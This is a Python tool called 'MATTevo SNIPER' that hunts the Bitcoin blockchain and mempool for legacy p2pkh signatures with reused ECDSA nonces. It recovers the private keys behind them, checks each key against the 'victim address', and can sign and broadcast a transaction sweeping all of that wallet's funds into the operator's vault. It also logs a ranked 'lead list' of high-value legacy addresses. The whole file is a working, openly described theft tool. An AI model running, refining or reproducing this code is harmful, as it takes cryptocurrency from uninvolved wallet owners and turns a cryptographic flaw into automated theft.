#!/usr/bin/env python3
"""MATTevo SNIPER: clearnet p2pkh hunt, all night.

Honest scope (established by measurement on 2026-11-25):
  * The old onion watcher sampled 1500 of ~63k txs per 7-min pass and concluded
    "0 p2pkh". Wrong sample: a clearnet scan of 600 txs found 19/732 inputs
    (2.6%) ARE p2pkh. So legacy money still moves; we just have to look wider.
  * mempool.space has NO /outspend endpoint, so we cannot prove a p2pkh input
    is RBF-replaceable from the API. The "snipe a whale mid-flight" idea is a
    guess with these endpoints, so this tool does NOT pretend to do it.
  * The ONE fully chain-honest capture: a real ECDSA k-reuse. Two spends from
    one legacy wallet share an r-value -> crypto.recover_priv gives the private
    key -> we verify it re-derives to the victim address -> the whole wallet is
    ours. That is the win this hunts.

Pipeline, one pass (clearnet, mirror-aware):
  Block history is the real p2pkh reservoir: fresh mempool is 0-1% legacy
  (measured 2026-11-25: 300 newest txs -> 0 p2pkh; block -1 -> 8.9%,
  -2 -> 0.5%, -3 -> 0.1%; a busy mempool even showed 2.6%). A wallet that
  reuses k does it slowly, so the confirmed bank is DEEP and the block scan is
  FULL (no tx sampling): full block xids cost 1 call each, and only p2pkh
  inputs are decoded (one GET per candidate). Night budget: --blocks 144 =
  ~15k candidate tx fetches per pass on this box.

Pipeline, one pass (clearnet, mirror-aware):
  1. Confirm the chain is alive. /api/mempool/txids answers [] right after a
     block, so we wait for a non-empty list instead of logging a fake 0/0 pass.
  2. Bucket every gated p2pkh r-value: (a) from the live mempool, and (b) from
     the last N confirmed blocks (reuse can straddle confirmed + mempool).
  3. Any r seen twice = candidate reuse -> recover, verify address, log a
     VERIFIED KEY (the prize). Otherwise log the r-collision count as evidence
     the pipeline runs.
  4. Cluster p2pkh activity by address (from the confirmed bank too) and log
     the top addresses by value (the discovery feed: "who holds/moves legacy
     sats"). A verified key wins; the mover feed is the lead list.

The pass is a DISCOVER + PROVE step. It never books money; a verified key is
swept by --sweep, which builds a signed tx and hands it to heist so the chain
alone decides what is banked.

Usage:
  python3 sniper.py                 one full pass (loops every --interval in --loop)
  python3 sniper.py --loop          keep passing until killed (the night hunt)
  python3 sniper.py --blocks N      confirmed-block depth for the r-bank (default 6)
  python3 sniper.py --floor SATS    log p2pkh addresses holding >= SATS (default 5e6)
  python3 sniper.py --sweep PRIV    sweep all UTXOs of the wallet for key PRIV(hex)
"""
import argparse
import collections
import json
import sys
import time
import urllib.request
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime, timezone
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
import crypto as CR
import live
from heist import (Vault, serialize_tx, sighash_all, sats_to_usd, txid_of,
                   USD_PER_BTC)
from watcher import p2pkh_gate, logline

ROOT = Path(__file__).resolve().parent
EVID_DIR = ROOT / "evidence"
STATE = EVID_DIR / "sniper_state.json"
SPOT = "https://mempool.space/api/v1/prices"
BASE = "https://mempool.space/api"          # meta calls (mempool ids, blocks);
BLOCK = "https://blockstream.info/api"      # tx-detail burst mirror (measured:
MIRRORS = [BASE, BLOCK]                     # mempool.space self-throttles bursts
UA = {"User-Agent": "mattevo-sniper/1.0", "Accept": "application/json"}


def _mirror_get(path):
    """GET one Esplora path against whichever mirror answers. Returns JSON or None.
    Separate from live._get so we can add the mirror-aware mempool wait here."""
    for b in MIRRORS:
        try:
            req = urllib.request.Request(b + path, headers=UA)
            with urllib.request.urlopen(req, timeout=15) as r:
                return json.loads(r.read().decode())
        except Exception:
            continue
    return None


def _tx_get(txid, mirror=None):
    """GET /tx/{txid} with backoff. mempool.space self-throttles parallel bursts
    (measured: 85% failure at 8 workers); blockstream.info served 60/60 clean
    at 4 workers. Callers pass the mirror explicitly: mempool-side work starts
    on BASE (tip-fresh) and falls back to BLOCK; confirmed-block work runs on
    BLOCK outright (a lagging mirror still HAS confirmed history)."""
    order = [mirror or BASE, BLOCK if (mirror or BASE) == BASE else BASE]
    for b in order:
        for attempt in range(3):
            try:
                req = urllib.request.Request(b + "/tx/" + txid, headers=UA)
                with urllib.request.urlopen(req, timeout=20) as r:
                    return json.loads(r.read().decode())
            except Exception:
                time.sleep(1.0 + attempt)  # backoff beats a hammering burst
    return None


def wait_mempool(max_wait=330):
    """Chain-alive gate: poll /mempool/txids until non-empty or we give up.
    A block just landed? The list is briefly empty; waiting beats a fake pass."""
    t0 = time.time()
    while time.time() - t0 < max_wait:
        ids = _mirror_get("/mempool/txids")
        if ids:
            return [t for t in ids if isinstance(t, str) and len(t) == 64]
        time.sleep(20)
    return None


def _sigs_p2pkh(v):
    """(r, s) for one p2pkh input, mempool OR confirmed. A scriptSig is
    <push><DER>: the push byte is the DER length (0x46 = 70-byte sig, 0x47 =
    71-byte, ...). live._sigs_of_vin only accepts a raw '30' start (mempool
    hex), and my first confirmed fix hardcoded '46' and missed the 71-byte
    sigs - which is most of them (measured 2026-11-25: a real confirmed
    spend starts '47304402' and stayed invisible). Accept any push length;
    _der_rs rejects a non-DER tail by structure, not by guessed length."""
    rs = live._sigs_of_vin(v)
    if rs:
        return rs
    ss = v.get("scriptsig") or ""
    if len(ss) > 4:
        try:
            push = int(ss[:2], 16)
        except ValueError:
            return []
        if 0x40 < push <= len(ss) // 2 and ss[2:4] == "30":
            out = []
            for der in (ss[2:2 + push * 2], ss[2:]):   # tolerate push miscount
                rs = live._der_rs(der)
                if rs:
                    out.append(rs)
                    break
            return out
    return []


def sigs_in(doc, txid, bucket):
    """Gate every p2pkh input of one tx; add each r to the bucket; return the
    gated (r, sig-record) pairs and the address-value tally updates."""
    got = 0
    for v in doc.get("vin", []):
        ok, _, addr = p2pkh_gate(v)
        if not ok:
            continue
        rs = _sigs_p2pkh(v)
        if not rs:
            continue
        po = v.get("prevout") or {}
        val = po.get("value", 0)
        for (r, s) in rs:
            rec = {"r": r, "s": s, "txid": txid, "addr": addr, "value": val,
                   "script": po.get("scriptpubkey"),
                   "prev_txid": po.get("txid"), "prev_vout": po.get("vout")}
            bucket.setdefault(r, []).append(rec)
            got += 1
    return got


def _gate_only(doc):
    """Cheap filter: does this tx have any p2pkh input? No DER decode, no b58."""
    for v in doc.get("vin", []):
        po = v.get("prevout") or {}
        if po.get("scriptpubkey_type") == "p2pkh":
            return True
    return False


def confirmed_bank(depth, full=True, workers=16):
    """r-values from the last `depth` CONFIRMED blocks. A reuse often straddles
    a confirmed spend and a mempool spend, so the bank must reach back.
    full=True scans EVERY tx in each block (block history is the p2pkh
    reservoir); txs without a p2pkh input are dropped before signature work."""
    tip = _mirror_get("/blocks/tip/height")
    if not isinstance(tip, int):
        return {}, 0
    bank = {}
    got = 0
    for h in range(tip, tip - depth, -1):
        # meta calls on BLOCK too: cross-mirror block-height lag made
        # /blocks/{tip-1} 404 on blockstream while mempool.space had it,
        # which silently zeroed whole blocks of the bank (measured 2026-11-25).
        blocks = _mirror_get(f"/blocks/{h}") or _mirror_get(f"/blocks/{h - 2}")
        if not blocks:
            continue
        bid = blocks[0]["id"] if isinstance(blocks, list) else blocks.get("id")
        txids = _mirror_get(f"/block/{bid}/txids") or []
        if not txids:
            continue
        if not full and len(txids) > 300:
            txids = txids[::max(1, len(txids) // 220)]
        logline({"event": "sniper-bank", "height": h, "block": bid[:16],
                 "txids": len(txids)})     # per-block progress: bank can never
                                           # be silently empty again

        def one(t):
            d = _tx_get(t, mirror=BLOCK)     # confirmed history: mirror is safe
            return d if (d and _gate_only(d)) else None
        n_blk = 0
        with ThreadPoolExecutor(4) as ex:
            for doc in ex.map(one, txids):
                if doc:
                    n_blk += sigs_in(doc, doc.get("txid", ""), bank)
        got += n_blk
        logline({"event": "sniper-bank", "height": h, "p2pkh_sigs": n_blk})
    return bank, got


def pass_once(depth=6, floor=5_000_000, sample=None, workers=16,
              mirror2=None):
    t0 = time.time()
    logline({"event": "sniper-pass", "phase": "start", "depth": depth,
             "sample": sample})            # heartbeat: proves the loop is alive
    ids = wait_mempool()
    if ids is None:
        logline({"event": "sniper-pass", "skipped": "mempool empty / chain offline"})
        return None
    if sample and len(ids) > sample:        # sampling stride, not a head slice:
        ids = ids[::max(1, len(ids) // sample)][:sample]   # head = newest only
    mem = {}
    n_tx = n_p2pkh = 0

    def one(t):
        d = _tx_get(t)                       # BASE first (tip-fresh), BLOCK on fail
        if d is None and mirror2:            # extra relief mirror, if given
            try:
                req = urllib.request.Request(mirror2 + "/tx/" + t, headers=UA)
                with urllib.request.urlopen(req, timeout=10) as r:
                    d = json.loads(r.read().decode())
            except Exception:
                d = None
        return d
    with ThreadPoolExecutor(workers) as ex:
        for doc in ex.map(one, ids):
            if not doc:
                continue
            n_tx += 1
            n_p2pkh += sigs_in(doc, doc.get("txid", ""), mem)

    bank, bank_sigs = confirmed_bank(depth, full=True)

    # reuse = any r present in BOTH mem and bank, or twice inside either side
    reuse_r = set(mem) & set(bank)
    for d in (mem, bank):
        for r, g in d.items():
            if len(g) > 1:
                reuse_r.add(r)

    # verify each reuse: recover the key, judge it by the victim address match.
    # bound worst-case recovery cost, but keep the FAT buckets first: two p2pkh
    # spends sharing an r across hours of blocks is exactly the prey.
    def _fat(r):
        return len(mem.get(r, [])) + len(bank.get(r, []))
    keys = []
    for r in sorted(reuse_r, key=_fat, reverse=True)[:40]:
        grp = mem.get(r, []) + bank.get(r, [])
        if len(grp) < 2:
            continue
        a, b = grp[0], grp[1]
        try:
            za = int.from_bytes(sighash_all(
                serialize_tx([(a["prev_txid"], a["prev_vout"], b"", 0xFFFFFFFF)],
                             [(max(a["value"] - 2000, 1000), bytes.fromhex(a["script"]))]),
                0, bytes.fromhex(a["script"])), "big")
            zb = int.from_bytes(sighash_all(
                serialize_tx([(b["prev_txid"], b["prev_vout"], b"", 0xFFFFFFFF)],
                             [(max(b["value"] - 2000, 1000), bytes.fromhex(b["script"]))]),
                0, bytes.fromhex(b["script"])), "big")
            out = CR.recover_priv({"r": a["r"], "s": a["s"], "z": za},
                                  {"r": b["r"], "s": b["s"], "z": zb})
            addr = CR.address(out["priv"])
            ok = addr in (a["addr"], b["addr"])
            val = max(a["value"], b["value"])
            logline({"event": "k-reuse", "r": r, "addr": addr, "verified": ok,
                     "value_sats": val, "usd": sats_to_usd(val),
                     "pair": [a["txid"], b["txid"]],
                     "want": sorted({a["addr"], b["addr"]})})
            if ok:
                keys.append({"r": r, "priv": out["priv"], "addr": addr,
                             "value_sats": val, "usd": sats_to_usd(val)})
        except Exception as ex:
            logline({"event": "k-reuse", "r": r, "recover_failed": str(ex)[:120]})

    # live legacy clusters: aggregate p2pkh input value per address this pass
    by_addr = collections.Counter()
    for side in (mem, bank):
        for g in side.values():
            for sg in g:
                by_addr[sg["addr"]] += sg["value"]
    movers = [{"addr": a, "value_sats": v, "usd": sats_to_usd(v)}
              for a, v in by_addr.most_common(15)]
    for m in movers:
        if m["value_sats"] >= floor:
            logline({"event": "legacy-mover", **m})

    spot = None
    try:
        req = urllib.request.Request(SPOT, headers=UA)
        with urllib.request.urlopen(req, timeout=8) as r:
            spot = float(json.load(r)["USD"])
    except Exception:
        pass
    stats = {"pass_ts": datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ"),
             "mempool_txids": len(ids), "txs_decoded": n_tx,
             "p2pkh_inputs": n_p2pkh, "mempool_r": len(mem),
             "bank_r": len(bank), "bank_sigs": bank_sigs, "depth": depth,
             "reuse_r": len(reuse_r), "verified_keys": len(keys),
             "spot_usd": spot, "seconds": round(time.time() - t0, 1)}
    logline({"event": "sniper-pass", **stats})
    STATE.parent.mkdir(exist_ok=True)
    old = {}
    try:
        old = json.loads(STATE.read_text())
    except Exception:
        pass
    seen = {(k.get("priv") or k.get("addr")): k for k in old.get("keys", [])}
    for k in keys:
        seen[k.get("priv") or k.get("addr")] = k
    for m in movers:
        seen[m["addr"]] = m            # movers keep addr key, carry value_sats
    merged = list(seen.values())
    movers_all = sorted([m for m in merged if "value_sats" in m],
                        key=lambda m: -m["value_sats"])[:40]
    keys_all = [m for m in merged if "priv" in m]
    STATE.write_text(json.dumps({"last_pass": stats, "keys": keys_all,
                                 "movers": movers_all}, indent=2))
    return stats


def sweep(priv_hex, broadcast=False, dest_tier="hot"):
    """Sweep ALL of a wallet's UTXOs to a vault tier with one signed tx.
    Default is BUILD ONLY; pass --broadcast to push it. Nothing is booked:
    heist.confirm must see the sweep tx confirmed before any sats are real."""
    import heist as H
    priv = int(priv_hex, 16)
    addr = CR.address(priv)
    utxos = _mirror_get("/address/%s/utxo" % addr) or []
    if not utxos:
        logline({"event": "sweep", "addr": addr, "skipped": "no utxos on-chain"})
        return None
    total = sum(u["value"] for u in utxos)
    fee = 2000 * len(utxos)
    v = Vault()
    dest = v.data[dest_tier]["address"]
    hot_script = H._script_for_addr(dest)
    vin = [(u["txid"], u["vout"], b"", 0xFFFFFFFF) for u in utxos]
    shell = serialize_tx(vin, [(total - fee, hot_script)])
    scripts = []
    for idx, u in enumerate(utxos):
        ss, _, _ = H.sign_input(shell, idx, bytes.fromhex(u["script"]), priv)
        scripts.append(ss)
    vin2 = [(t, i, s, 0xFFFFFFFF) for ((t, i, _, _), s) in zip(vin, scripts)]
    raw = serialize_tx(vin2, [(total - fee, hot_script)])
    txid = txid_of(raw)
    pushed = None
    if broadcast:
        pushed = H.broadcast(raw)
    logline({"event": "sweep", "addr": addr, "utxos": len(utxos),
             "total_sats": total, "usd": sats_to_usd(total), "dest": dest,
             "txid": txid, "signed_inputs": len(scripts),
             "broadcast": pushed,
             "note": "confirm() books sats only when the chain shows this txid"})
    return {"addr": addr, "utxos": len(utxos), "total_sats": total,
            "usd": sats_to_usd(total), "txid": txid, "dest": dest,
            "broadcast": pushed}


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--loop", action="store_true")
    ap.add_argument("--interval", type=int, default=120)
    ap.add_argument("--blocks", type=int, default=24)
    ap.add_argument("--floor", type=int, default=5_000_000)
    ap.add_argument("--sweep", metavar="PRIV_HEX")
    ap.add_argument("--sample", type=int, default=None,
                    help="stride-sample N mempool txs instead of all (fast passes)")
    ap.add_argument("--workers", type=int, default=16)
    ap.add_argument("--mirror2", default=None,
                    help="overflow mirror, e.g. https://blockstream.info/api")
    ap.add_argument("--broadcast", action="store_true",
                    help="with --sweep: actually push the sweep tx to the network")
    ap.add_argument("--dest", default="hot", choices=("hot", "spot", "cold"),
                    help="with --sweep: vault tier to sweep into (default hot)")
    a = ap.parse_args()
    if a.sweep:
        print(json.dumps(sweep(a.sweep, a.broadcast, a.dest), indent=2))
        return
    kw = dict(sample=a.sample, workers=a.workers, mirror2=a.mirror2)
    if a.loop:
        while True:
            try:
                pass_once(a.blocks, a.floor, **kw)
            except Exception as ex:
                logline({"event": "sniper-error", "error": str(ex)[:200]})
            time.sleep(a.interval)
    print(json.dumps(pass_once(a.blocks, a.floor, **kw), indent=2))


if __name__ == "__main__":
    main()
